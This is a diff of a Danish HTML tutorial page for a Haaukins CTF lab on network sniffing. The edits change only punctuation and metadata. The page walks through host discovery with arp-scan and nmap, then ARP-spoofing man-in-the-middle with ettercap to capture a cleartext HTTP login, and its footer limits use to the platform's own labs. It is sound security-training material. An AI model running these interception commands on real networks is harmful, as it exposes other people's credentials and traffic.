@@ -3,14 +3,18 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Haaukins: Network sniffing — tutorial (ARP-spoofing MITM)</title>
+<title>Haaukins: Network sniffing tutorial (ARP-spoofing MITM)</title>
 <meta name="description" content="Trin-for-trin guide til Haaukins Network sniffing: bliv man-in-the-middle med ARP-spoofing og læs et klartekst-HTTP-login ud af trafikken.">
 <link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/network-sniffing.html">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Haaukins: Network sniffing — tutorial (ARP-spoofing MITM)">
+<meta property="og:title" content="Haaukins: Network sniffing tutorial (ARP-spoofing MITM)">
 <meta property="og:description" content="Trin-for-trin guide til Haaukins Network sniffing: bliv man-in-the-middle med ARP-spoofing og læs et klartekst-HTTP-login ud af trafikken.">
 <meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/network-sniffing.html">
-<meta name="twitter:card" content="summary">
+<meta property="og:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
 <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Network sniffing", "description": "Trin-for-trin guide til Haaukins Network sniffing: bliv man-in-the-middle med ARP-spoofing og læs et klartekst-HTTP-login ud af trafikken.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/network-sniffing.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
 <link rel="stylesheet" href="assets/style.css">
 <script src="assets/gloss.js" defer></script>
@@ -23,21 +27,21 @@
 <p class="subtitle">Aflyt et klartekst-HTTP-login ved at gøre dig selv til mellemmand.</p>
 <div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
-<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a> · <a href="arp-mitm.html">Primer: ARP-spoofing &amp; MITM</a>.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik. Læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a> · <a href="arp-mitm.html">Primer: ARP-spoofing &amp; MITM</a>.</div>
 <h2>Hvad går opgaven ud på?</h2>
 <p>To maskiner taler sammen i <strong>klartekst</strong> (et HTTP-login), og opgaven hinter:
              <em>"all network traffic is passing through your Kali machine"</em>. Du skal aflytte trafikken
-             og finde flaget — hvilket kræver at du selv bliver mellemmanden (se primeren ovenfor).</p>
+             og finde flaget, hvilket kræver at du selv bliver mellemmanden (se primeren ovenfor).</p>
 <h2>Trin for trin</h2>
 <ol class="steps">
              <li>Find din placering og de andre hosts: <code>ip -br a</code> og
              <code>sudo <span class="gloss" tabindex="0" data-tip="Finder andre hosts på det lokale netsegment via ARP-forespørgsler.">arp-scan</span> -I eth0 --localnet</code>.</li>
-             <li>Find hvem der er server: <code>sudo <span class="gloss" tabindex="0" data-tip="Netværksscanner — finder åbne porte og services på en host.">nmap</span> -Pn -sT -p80,21,23 &lt;hosts&gt;</code> — kun login-serveren
+             <li>Find hvem der er server: <code>sudo <span class="gloss" tabindex="0" data-tip="Netværksscanner: finder åbne porte og services på en host.">nmap</span> -Pn -sT -p80,21,23 &lt;hosts&gt;</code>. Kun login-serveren
              har <code>80/http</code> åben.</li>
              <li>Bliv MITM og lad ettercap dumpe klartekst-logins:
              <pre><code>sudo sysctl -w net.ipv4.ip_forward=1
 sudo <span class="gloss" tabindex="0" data-tip="ARP-spoofing/MITM-værktøj til at opsnappe trafik på et lokalt netværk.">ettercap</span> -T -q -i eth0 -M arp:remote /&lt;server-ip&gt;// ///</code></pre></li>
-             <li>Vent på det periodiske login — ettercap printer brugernavn, password og hele POST-body'en.</li>
+             <li>Vent på det periodiske login. Ettercap printer brugernavn, password og hele POST-body'en.</li>
              </ol>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Ettercap fanger login'et i klartekst; flaget ligger direkte i POST-body'en (URL-encoded,
@@ -56,7 +60,7 @@ bytes. Når du ser en app sende login over ren HTTP, er det altid værd at spør
 se dette på vejen?</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
-er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
+er en dansk undervisningsplatform til sikkerhedstræning (AAU, De Danske Cybermesterskaber). Alle opgaver
 løses på platformens egne, formålsbyggede lab-miljøer, aldrig på andres systemer. Guiden forudsætter du selv
 har autoriseret adgang (fx som studerende eller deltager) og er løsningsstøtte til at lære metoden, ikke en
 genvej uden om selv at forstå den.
